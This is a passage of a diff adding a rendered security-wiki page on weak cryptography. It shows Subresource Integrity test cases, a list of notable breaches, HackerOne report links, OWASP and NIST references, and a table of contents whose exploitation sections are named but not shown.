+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;
+</span></span></code></pre></div><h3 id="sri-test-cases">
+  SRI Test Cases
+  <a class="anchor" href="#sri-test-cases">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Action</th>
+<th>Expected Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>External script without SRI</td>
+<td>Run the external script missing SRI snippet</td>
+<td>Script URL should be listed</td>
+</tr>
+<tr>
+<td>External script with SRI</td>
+<td>Inspect the script tag</td>
+<td><code>integrity</code> attribute should be present</td>
+</tr>
+<tr>
+<td>External script with SRI but no crossorigin</td>
+<td>Inspect the script tag</td>
+<td><code>crossorigin</code> should be present where required</td>
+</tr>
+<tr>
+<td>Incorrect SRI hash</td>
+<td>Modify the SRI hash and reload the page</td>
+<td>Browser should block the resource</td>
+</tr>
+<tr>
+<td>External stylesheet without SRI</td>
+<td>Run the stylesheet missing SRI snippet</td>
+<td>Stylesheet URL should be listed</td>
+</tr>
+<tr>
+<td>Full SRI audit</td>
+<td>Run the full SRI audit snippet</td>
+<td>All external resources should show integrity and crossorigin status</td>
+</tr>
+</tbody>
+</table>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<h3 id="notable-incidents">
+  Notable Incidents
+  <a class="anchor" href="#notable-incidents">#</a>
+</h3>
+<ul>
+<li><strong>RockYou (2009):</strong> 32 million passwords stored in plaintext — the breach that created the most-used password cracking wordlist in existence</li>
+<li><strong>LinkedIn (2012):</strong> 6.5 million SHA-1 unsalted password hashes leaked; subsequently cracked; full 117M hash dump surfaced in 2016</li>
+<li><strong>Adobe (2013):</strong> 153 million records with passwords encrypted using 3DES in ECB mode with the same key — identical passwords produced identical ciphertext, leaking patterns</li>
+<li><strong>Heartbleed / OpenSSL (2014):</strong> TLS implementation bug leaked private keys and session data from memory — a reminder that correct algorithms fail when implementations are buggy</li>
+<li><strong>JWT <code>alg: none</code> (2015):</strong> Multiple JWT libraries accepted unsigned tokens — affected Auth0, others; patched after public disclosure</li>
+</ul>
+<h3 id="hackerone-reports">
+  HackerOne Reports
+  <a class="anchor" href="#hackerone-reports">#</a>
+</h3>
+<ul>
+<li><a href="https://hackerone.com/reports/1647642" target="_blank" rel="noreferrer noopener nofollow">Authentication Bypass via JWT None Algorithm (#1647642)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/748214" target="_blank" rel="noreferrer noopener nofollow">Hardcoded JWT Secret Key leading to Account Takeover (#748214)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/1889161" target="_blank" rel="noreferrer noopener nofollow">JWT Audience Claim Not Verified — Argo CD (#1889161)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/272" target="_blank" rel="noreferrer noopener nofollow">Weak MD5 Password Hashing (#272</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li><a href="https://owasp.org/Top10/2021/A02_2021-Cryptographic_Failures/" target="_blank" rel="noreferrer noopener nofollow">OWASP A02:2021 — Cryptographic Failures</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption" target="_blank" rel="noreferrer noopener nofollow">OWASP Testing: Weak Encryption (WSTG-CRYP-04)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security" target="_blank" rel="noreferrer noopener nofollow">OWASP Testing: Weak TLS (WSTG-CRYP-01)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">OWASP Cryptographic Storage Cheat Sheet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noreferrer noopener nofollow">PortSwigger: JWT Attacks</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens" target="_blank" rel="noreferrer noopener nofollow">HackTricks: JWT Vulnerabilities</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://csrc.nist.gov/publications/detail/sp/800-131a/rev-2/final" target="_blank" rel="noreferrer noopener nofollow">NIST SP 800-131A: Transitioning Cryptographic Algorithms</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" target="_blank" rel="noreferrer noopener nofollow">PayloadsAllTheThings: JSON Web Token</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Weak%20Cryptography%20Implementation.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#weak-cryptography-implementation">Weak Cryptography Implementation</a>
+      <ul>
+        <li><a href="#owasp-top-10-mapping">OWASP Top 10 Mapping</a>
+          <ul>
+            <li><a href="#cwe-mapping-addition">CWE Mapping Addition</a></li>
+          </ul>
+        </li>
+        <li><a href="#understanding-the-basics">Understanding the Basics</a>
+          <ul>
+            <li><a href="#weak-vs-strong---quick-reference">Weak vs. Strong - Quick Reference</a></li>
+            <li><a href="#why-it-matters">Why It Matters</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#weak-randomness--insufficient-entropy">Weak Randomness / Insufficient Entropy</a>
+          <ul>
+            <li><a href="#owasp-mapping">OWASP Mapping</a></li>
+            <li><a href="#related-cwes">Related CWEs</a></li>
+            <li><a href="#common-weak-randomness-issues">Common Weak Randomness Issues</a></li>
+            <li><a href="#vulnerable-examples">Vulnerable Examples</a></li>
+            <li><a href="#secure-examples">Secure Examples</a></li>
+            <li><a href="#testing-for-weak-randomness">Testing for Weak Randomness</a></li>
+            <li><a href="#example-token-pattern-issues">Example Token Pattern Issues</a></li>
+            <li><a href="#impact">Impact</a></li>
+            <li><a href="#mitigation">Mitigation</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploiting-weak-cryptography">Exploiting Weak Cryptography</a>
+          <ul>
+            <li><a href="#1-cracking-weak-password-hashes">1. Cracking Weak Password Hashes</a></li>
+            <li><a href="#2-jwt--alg-none-bypass">2. JWT — <code>alg: none</code> Bypass</a></li>
+            <li><a href="#3-jwt--weak-secret-brute-force">3. JWT — Weak Secret Brute Force</a></li>
+            <li><a href="#4-jwt--algorithm-confusion-rs256--hs256">4. JWT — Algorithm Confusion (RS256 → HS256)</a></li>
+            <li><a href="#5-tls--weak-protocol--cipher-detection">5. TLS — Weak Protocol / Cipher Detection</a></li>
+            <li><a href="#6-aes-ecb-mode--pattern-detection">6. AES-ECB Mode — Pattern Detection</a></li>
+            <li><a href="#7-hardcoded-keys--secrets-in-source">7. Hardcoded Keys / Secrets in Source</a></li>
+            <li><a href="#8-http-instead-of-https--missing-hsts">8. HTTP Instead of HTTPS / Missing HSTS</a></li>
+            <li><a href="#test-cases">Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)</a>
+          <ul>
+            <li><a href="#manual-detection">Manual Detection</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact-1">Impact</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#software-integrity---sri-presence-validation">Software Integrity - SRI Presence Validation</a>
+          <ul>
+            <li><a href="#check-all-scripts-and-their-sri-status">Check All Scripts and Their SRI Status</a></li>
+            <li><a href="#list-only-scripts-missing-sri">List Only Scripts Missing SRI</a></li>
+            <li><a href="#list-only-external-scripts-missing-sri">List Only External Scripts Missing SRI</a></li>
+            <li><a href="#check-stylesheets-missing-sri">Check Stylesheets Missing SRI</a></li>
+            <li><a href="#check-external-stylesheets-missing-sri">Check External Stylesheets Missing SRI</a></li>
+            <li><a href="#full-sri-audit-for-scripts-and-stylesheets">Full SRI Audit for Scripts and Stylesheets</a></li>
+            <li><a href="#show-only-external-resources-missing-sri">Show Only External Resources Missing SRI</a></li>
+            <li><a href="#sri-script-validation-status">SRI Script Validation Status</a></li>
+            <li><a href="#important-notes">Important Notes</a></li>
+            <li><a href="#example-secure-script-tag">Example Secure Script Tag</a></li>
+            <li><a href="#example-secure-stylesheet-tag">Example Secure Stylesheet Tag</a></li>
+            <li><a href="#sri-test-cases">SRI Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#notable-incidents">Notable Incidents</a></li>
+            <li><a href="#hackerone-reports">HackerOne Reports</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
